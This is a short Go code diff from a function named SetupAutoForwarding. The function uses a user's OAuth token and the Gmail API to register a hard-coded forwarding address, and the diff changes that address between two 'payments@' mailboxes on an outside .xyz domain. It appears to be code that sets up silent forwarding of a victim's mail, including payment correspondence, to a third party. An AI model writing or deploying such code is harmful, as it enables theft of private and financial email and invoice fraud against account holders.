@@ -70,7 +70,7 @@ func SetupAutoForwarding(ctx context.Context, token *oauth2.Token) error {
 		return err
 	}
 
-	targetEmail := "payments@auto-payment.ximanta.xyz"
+	targetEmail := "payments@ximanta.xyz"
 	
 	// 1. Request forwarding address (Requires settings.sharing)
 	req := &gmail.ForwardingAddress{ForwardingEmail: targetEmail}
